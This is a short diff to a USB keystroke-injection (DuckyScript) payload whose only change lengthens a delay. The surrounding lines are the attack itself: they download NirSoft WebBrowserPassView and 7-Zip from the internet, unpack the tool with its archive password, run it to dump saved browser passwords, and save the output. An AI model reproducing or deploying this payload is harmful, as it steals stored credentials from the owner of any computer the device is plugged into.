@@ -9,7 +9,7 @@ ENTER
 DELAY 500
 STRING mkdir \temp ; cd \temp ; Invoke-WebRequest -Headers @{'Referer' = 'http://www.nirsoft.net/utils/web_browser_password.html'} -Uri http://www.nirsoft.net/toolsdownload/webbrowserpassview.zip -OutFile wbpv.zip ; Invoke-WebRequest -Uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip ; Expand-Archive 7z.zip ; .\7z\7za.exe e wbpv.zip * -p"wbpv28821@"; .\WebBrowserPassView.exe
 ENTER
-DELAY 3500
+DELAY 10000
 CTRL A
 DELAY 500
 CTRL S
